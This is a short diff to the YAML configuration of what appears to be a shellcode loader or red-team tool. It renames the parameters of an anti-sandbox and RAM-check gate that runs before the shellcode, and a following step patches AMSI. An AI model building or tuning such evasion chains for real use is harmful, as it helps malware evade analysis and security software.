@@ -60,10 +60,10 @@ runtime:
   # 0. Gate + in-process preparation, then a returning shellcode.
   - technique: bouncer
     params:
-      mode: all
-      on_fail: silent
-      min_ram_mb: 512
-      not_in_sandbox: true
+      require:
+        - ram_mb: 512
+      anti_analysis:
+        sandbox: true
     delay_ms: 250
     on_fail: stop
   - technique: patch_amsi
